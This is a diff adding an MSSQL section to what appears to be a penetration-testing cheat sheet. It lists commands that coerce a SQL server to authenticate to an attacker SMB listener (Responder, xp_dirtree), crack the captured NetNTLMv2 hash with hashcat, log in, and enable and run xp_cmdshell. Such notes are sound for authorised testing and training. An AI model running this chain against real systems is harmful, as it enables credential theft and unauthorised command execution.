@@ -1544,6 +1544,49 @@ conn conceal
 </table>
 
 <h2>1025 TCP / msrpc</h2>
+<br>
+<h2>1433 TCP / Microsoft SQL</h2>
+<li>Good resource: http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</li>
+<li>Retrieve mssql service's password using smb</li>
+<table>
+    <tr>
+        <td>Set listener on Kali</td>
+        <td>sudo responder -I tun0</td>
+    </tr>
+    <tr>
+        <td>Connect to non-existing SMB server from mssql</td>
+        <td>xp_dirtree '\\&lt;ip address&gt;\&lt;fake share name&gt;'</td>
+    </tr>
+    <tr>
+        <td>Crack the NetNTLMv2 output hash on Kali responder</td>
+        <td>hashcat -m 5600</td>
+    </tr>
+    <tr>
+        <td>Log in with mssql-svc password retrieved</td>
+        <td>mssqlclient mssql-svc:'&ls;password&gt;'@&lt;ip&gt; -windows-auth</td>
+    </tr>
+</table>
+<li>Run / enable shell commands</li>
+<table>
+    <tr>
+        <td>Enable xp_cmdshell (with impacket-mssqlclient)</td>
+        <td>enable_xp_cmdshell</td>
+    </tr>
+    <tr>
+        <td>Run shell command (with impacket-mssqlclient)</td>
+        <td>xp_cmdshell &lt;command&gt;</td>
+    </tr>
+    <tr>
+        <td>Enable xp_cmdshell (without impacket-mssqlclient)</td>
+        <td>EXEC sp_configure 'show advanced options', 1;<br>RECONFIGURE;<br>EXEC sp_configure 'xp_cmdshell', 1;<br>RECONFIGURE;</td>
+    </tr>
+    <tr>
+        <td>Run shell command (without impacket-mssqlclient)</td>
+        <td>EXEC xp_cmdshell '&lt;command&gt;';</td>
+    </tr>
+</table>
+
+
 
 
 </body>
